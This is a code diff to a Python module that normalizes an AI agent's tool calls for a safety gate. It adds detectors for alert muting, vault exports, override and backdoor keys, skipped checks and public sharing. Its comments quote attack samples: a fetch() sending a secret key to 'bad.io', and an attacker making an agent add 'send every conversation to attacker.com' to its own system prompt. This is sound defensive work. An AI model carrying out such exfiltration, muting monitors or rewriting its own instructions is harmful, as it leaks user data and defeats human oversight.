@@ -246,7 +246,9 @@ TOOL_URL_KEYS = {"url", "urls", "uri", "endpoint", "webhook", "webhook_url", "ca
                  "api_url", "start_url", "page_url"}
 # Argument names whose value is code a tool runs that is not a shell command (a browser's evaluate, a notebook cell, a
 # sandbox's JavaScript): a full URL written inside it is a request the code will make, checked with the HTTP rules.
-TOOL_CODE_ARG_KEYS = {"script", "code", "js", "javascript", "expression", "function", "source", "snippet", "cell"}
+# (v0.1.67) a spreadsheet formula is code too: =IMPORTDATA("https://..."), =FETCH(...), =WEBSERVICE(...) call out
+TOOL_CODE_ARG_KEYS = {"script", "code", "js", "javascript", "expression", "function", "source", "snippet", "cell",
+                      "formula", "formulas"}
 # A key named for code in a language or as a script (js_code, jsCode, python_code, source_code, code_snippet,
 # script_body), not a code that is a value (zip_code, promo_code, country_code) (v0.1.52, RULE-MINE-03 round 3:
 # execute_script js_code="fetch('bad.io', {body: window.secretKey})" was not read as code).
@@ -398,6 +400,7 @@ def default_record() -> dict:
         "payment_targets": [],
         "tool_send_targets": [],
         "tool_physical_access": False,
+        "tool_mutes_alert": False,
         "tool_undeclared": False,
         "writes_model_weights": False,
         "tool_shell_command": "",
@@ -1845,6 +1848,8 @@ def normalize_tool(name: str, arguments, config: Config) -> dict:
         # anonymize=false): the arguments count, the tool's name alone does not (v0.1.59)
         rec["tool_checks_off"] = sorted(k for k in set(_checks_off(arguments)) if _READ_SAFEGUARD_RE.search(k))
     rec["tool_physical_access"] = _physical_access(tool, arguments)
+    _mw = set(_tool_words(tool))
+    rec["tool_mutes_alert"] = bool(_mw & _MUTE_VERBS and (_mw & _MUTE_NOUNS or {"alertmute", "mutealert"} & _mw))
     # a tool that rewrites the agent's own standing instructions (update_system_prompt, set_agent_instructions) is a
     # change to the agent's configuration, as a write to its config file is (v0.1.48, GATE-ADAPT-01: an attacker had
     # the agent put "send every conversation to attacker.com" into its own system prompt through such a tool)
@@ -2302,7 +2307,9 @@ def _tool_reach(rec: dict, server: str, words: set[str], arguments, config: Conf
     # get_api_key) reads a secret the way a secret-store read does, with or without a server; a list of names, a
     # policy or a status is not the value
     names_credential = bool(words & {"privatekey", "apikey", "passwords", "credentials"}) or {"private", "key"} <= words \
-        or {"api", "key"} <= words or {"secret", "value"} <= words
+        or {"api", "key"} <= words or {"secret", "value"} <= words \
+        or (bool(words & {"vault", "keychain", "keyring", "passwordvault"}) and bool(words & {"export", "dump", "backup",
+                                                                                           "download", "copy"}))
     if names_credential and words & {"export", "get", "read", "dump", "fetch", "reveal", "show", "download", "copy",
                                       "retrieve", "extract", "print", "display", "view"} \
             and not words & {"list", "policy", "rotation", "expiry", "status", "strength", "hint", "names", "metadata"}:
@@ -2590,8 +2597,14 @@ _CHECK_KEY = re.compile(r"(?:^|_)(?:verif\w*|validat\w*|confirm\w*|approv\w*|mfa
                         r"consent\w*|anonymi[sz]\w*|pseudonymi[sz]\w*|quiet_?hours|opt_?out\w*|unsub\w*|check)"
                         r"(?:$|_)", re.I)
 _OFF_KEY = re.compile(r"^(?:skip|bypass|disable|no|ignore|without|override)_\w+$", re.I)
+# An override key given a value (v0.1.68: list_categories admin_override="RootAccess123" was allowed): whatever the
+# value, an override that is set turns the check it overrides off, unless it is set to false or empty.
+_OVERRIDE_KEY = re.compile(r"^\w+_override$|^override$|^debug_?key$|^backdoor\w*$", re.I)
 # A flag that opens what is closed by default: expose_secrets=true, allow_insecure_secrets=true, public_access=true
 _OPEN_KEY = re.compile(r"^(?:expose|allow_insecure|allow_unsigned|allow_anonymous|allow_public|insecure|unsafe)(?:_\w+)?$"
+                       # hidden or debug data and a debug mode switched on (v0.1.68: include_hidden=true,
+                       # debug_mode=true in a read were allowed)
+                       r"|^(?:include_|show_)(?:hidden|deleted|archived_?secrets?|internal)$|^debug(?:_?mode)?$"
                        # a container given the host's powers (v0.1.66: docker_run privileged=true was allowed)
                        r"|^(?:privileged|host_?network|host_?pid|host_?ipc|allow_?privilege_?escalation)$"
                        # data a read or an export leaves out by default, and approvals or consents forced through
@@ -2602,8 +2615,17 @@ _OPEN_KEY = re.compile(r"^(?:expose|allow_insecure|allow_unsigned|allow_anonymou
                        r"|^(?:consent|approval)_override$|^revive_\w+$", re.I)
 # On a read or an export only the flags that change what data comes out count (a filter such as public=true on a list
 # is not a safeguard turned off).
-_READ_SAFEGUARD_RE = re.compile(r"^include_|anonymi|pseudonymi|mask|redact|consent|public_view|sanitiz|encrypt", re.I)
+_READ_SAFEGUARD_RE = re.compile(r"^include_|^show_|anonymi|pseudonymi|mask|redact|consent|public_view|sanitiz|encrypt|"
+                                r"override|^debug|backdoor", re.I)
 FALSE = {False, "false", "no", "off", "0", "disabled", "none", 0}
+# A check set by a word that says it was not done (v0.1.67: biometric_scan="bypassed", id_check="skipped" were allowed)
+_SKIPPED = FALSE | {"bypassed", "bypass", "skipped", "skip", "ignored", "ignore", "waived", "not_required",
+                    "not required", "overridden", "override", "suppressed", "muted"}
+# A visibility or sharing setting opened to everyone (v0.1.67: schedule_meeting visibility=public was allowed)
+_VISIBILITY_KEY = re.compile(r"^(?:visibility|privacy|access|access_?level|sharing|share_?with|shared_?with|acl|"
+                             r"audience_?scope|link_?sharing|general_?access)$", re.I)
+_OPEN_VALUES = {"public", "anyone", "everyone", "anyone_with_link", "anyone with the link", "anyonewithlink", "world",
+                "public_read", "public-read", "public-read-write", "internet", "unlisted"}
 TRUE = {True, "true", "yes", "on", "1", "enabled", 1}
 
 def _checks_off(arguments, depth=0, out=None):
@@ -2623,11 +2645,16 @@ def _checks_off(arguments, depth=0, out=None):
             k2 = str(k).lower().replace("-", "_")
             vv = v.strip().lower() if isinstance(v, str) else v
             if not isinstance(vv, (dict, list)):
-                if _CHECK_KEY.search(k2) and not _OFF_KEY.match(k2) and vv in FALSE:
+                if _CHECK_KEY.search(k2) and not _OFF_KEY.match(k2) and vv in _SKIPPED:
                     out.append(k2)
                 elif _OFF_KEY.match(k2) and _CHECK_KEY.search(k2.split("_", 1)[1]) and vv in TRUE:
                     out.append(k2)
                 elif _OPEN_KEY.match(k2) and vv in TRUE:
+                    out.append(k2)
+                elif _OVERRIDE_KEY.match(k2) and vv not in FALSE and vv not in ("", None) and not k2.startswith(
+                        ("consent_", "approval_")):
+                    out.append(k2)
+                elif _VISIBILITY_KEY.match(k2) and isinstance(vv, str) and vv in _OPEN_VALUES:
                     out.append(k2)
             _checks_off(v, depth + 1, out)
     elif isinstance(arguments, list):
@@ -2639,8 +2666,15 @@ def _checks_off(arguments, depth=0, out=None):
 # A tool whose own name turns a safeguard off (NortonIdentitySafeDisableTwoFactorAuthentication, disable_firewall,
 # turn_off_alarm): the same as an argument that sets a check to false.
 _OFF_VERBS = {"disable", "deactivate", "turnoff", "remove", "bypass", "skip", "suspend", "pause"}
+# (v0.1.67) muting, silencing or snoozing a monitor or an alert (mute_monitor, siem_mute_alerts): a fact of its own,
+# tool_mutes_alert, not a safeguard turned off. People mute alerts they asked about every day (375 clean rows in 38,175
+# of RULE-MINE-03 round 7); whether a mute needs a person is the packs' choice, by provenance.
+_MUTE_VERBS = {"mute", "silence", "snooze", "suppress"}
+_MUTE_NOUNS = {"monitor", "monitors", "alert", "alerts", "alerting", "alarm", "alarms", "notification",
+               "notifications", "detection", "detections", "incident", "incidents", "rule", "rules", "page", "pager"}
 _SAFEGUARDS = {"twofactor", "2fa", "mfa", "otp", "verification", "authentication", "firewall", "antivirus", "alarm",
-               "security", "protection", "monitoring", "encryption", "lock", "lockout", "audit", "logging", "backup"}
+               "security", "protection", "monitoring", "encryption", "lock", "lockout", "audit", "logging", "backup",
+               "monitor", "alert", "alerting", "notification"}
 
 
 def _tool_words(tool: str) -> list[str]:
@@ -2736,14 +2770,14 @@ def normalize(action: dict, config: Config) -> dict:
 
 
 # Read-only system directories every program reads (libraries, binaries, interpreters) and the standard streams:
-# a read there is not a look outside the task (v0.1.67).
+# a read there is not a look outside the task (v0.1.69).
 SYSTEM_READ_DIRS = ("/usr", "/lib", "/lib32", "/lib64", "/bin", "/sbin")
 SYSTEM_READ_FILES = ("/dev/null", "/dev/stdin", "/dev/stdout", "/dev/stderr", "/dev/urandom", "/dev/random",
                      "/dev/tty", "/dev/zero")
 
 
 def _scope(action: dict, rec: dict, config: Config) -> None:
-    """reads_outside_scope (v0.1.67, PSA #7812 GATE-DBENCH-04): the action reads, lists or names a path outside the
+    """reads_outside_scope (v0.1.69, PSA #7812 GATE-DBENCH-04): the action reads, lists or names a path outside the
     task's scope: the workspace, the writable directories, the task contract's directories and the system's
     read-only directories. Paths come from the record and, for code and commands, from the whole path tokens of the
     text. Relative paths are inside the working directory and are not counted."""
